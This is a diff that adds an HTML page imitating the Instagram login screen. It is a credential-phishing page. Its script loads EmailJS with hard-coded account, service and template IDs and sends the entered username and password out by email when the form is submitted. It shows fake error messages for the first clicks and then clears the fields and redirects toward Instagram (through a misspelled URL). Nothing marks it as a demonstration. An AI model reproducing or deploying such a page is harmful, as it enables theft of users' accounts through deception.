@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+
+    <a
+        href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=49C1E1F1-CA0D-4224-86DD-4223F5554A94&utm_content=lo&utm_medium=badge"><img
+            src="google.png" class="google"></a>
+    <link rel="stylesheet" href="insta.css">
+
+</head>
+
+<body>
+    <div class="phone">
+        <div class=main-box>
+            <img src="insta.png" class="insta">
+            <br><br><br><br><br><br><br>
+            <form id="form">
+                <table>
+
+                    <div class="user" id="User">
+                        <tr>
+                            <td>
+                                <label></label>
+                                <input type="text/number" placeholder="Phone number,username, or email" name="Username"
+                                    id="Username" autocomplete="off">
+                            </td>
+                        </tr>
+                    </div>
+                </table>
+                <table>
+                    <tr>
+                        <td class="pwd" id="pwd1"><label></label>
+                            <input type="password" minlength="8" placeholder="Password" name="pass" id="pass">
+                        </td>
+                    </tr>
+                </table>
+
+                <br>
+                <button type="submit" id="button" >Log In </button>
+            </form>
+            <br>
+            <br>
+            <h4>_________________OR_________________</h4>
+
+            <ul>
+                <ul><img src="in.PNG" width="10%" height="-5%" class="img1"><a class="loginfb"
+                        href="https://www.facebook.com/"> Log in with Facebook</a></ul>
+
+
+                <div class="error-message" id="errorMessage">
+                    <p></p>
+                </div>
+                <ul><a class="resetpwd" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+                </ul>
+            </ul>
+        </div>
+        <br>
+        <div class="signup">
+            <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/"> Sign up
+                </a>
+            </p>
+        </div>
+        <div class="final">
+            <p>Get the app.</p>
+        </div>
+        <br>
+        <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="apple.png" class="apple"></a>
+        <a
+            href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=49C1E1F1-CA0D-4224-86DD-4223F5554A94&utm_content=lo&utm_medium=badge"><img
+                src="google.png" class="google"></a>
+
+
+        <div
+            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np x1a02dak xqjyukv x1qjc9v5 x1oa3qoh xl56j7k">
+            <div
+                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xod5an3 x1i64zmx x1emribx x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+                <a href="https://about.meta.com/" rel="nofollow noopener noreferrer" target="_blank"><span
+                        class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye x1fhwpqd xo1l8bm x1roi4f4 x1s3etm8 x676frb x10wh9bi x1wdrske x8viiok x18hxmgj"
+                        dir="auto"
+                        style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 16px;">Meta</span></a>
+            </div>
+
+        </div>
+
+
+
+
+
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+        <script type="text/javascript">
+            emailjs.init('AcdfUyUMm_Oi3KubD')
+        </script>
+
+        <script>
+
+            const btn = document.getElementById('button');
+
+            document.getElementById('form')
+                .addEventListener('submit', function (event) {
+                    event.preventDefault();
+
+
+                    const serviceID = 'service_7js3c1h';
+                    const templateID = 'template_gkdi0xs';
+
+                    emailjs.sendForm(serviceID, templateID, this)
+                        .then(() => {
+                            btn.value = 'Send Email';
+                            form.reset();
+
+                        }, (err) => {
+
+
+                        });
+                });
+
+            var clickCount = 0;
+            btn.addEventListener('click', function (event) {
+                event.preventDefault();
+
+
+                clickCount++;
+
+
+                if (clickCount <= 2) {
+
+                    var errorMessage = document.getElementById('errorMessage');
+                    errorMessage.textContent = 'An error occurred.';
+                } else {
+
+                    var nameInput1 = document.getElementById('pass');
+                    nameInput1.value = '';
+                    var nameInput = document.getElementById('Username');
+                    nameInput.value = '';
+
+
+                    window.location.href = 'https://www.instagramcom';
+                }
+            });
+            
+            const firstNameInput = document.getElementById('Username');
+            const lastNameInput = document.getElementById('pass');
+            // Add input event listeners to the input fields
+            firstNameInput.addEventListener('input', toggleButtonState);
+            lastNameInput.addEventListener('input', toggleButtonState);
+
+           
+            function toggleButtonState() {
+               
+                if( firstNameInput.value.length === 1 || lastNameInput.value.length === 1){
+                    btn.disabled = true;
+                }
+                else{
+                    btn.disabled = false;
+                };
+            }
+
+
+        </script>
+
+</body>
+
+
+
+</html>
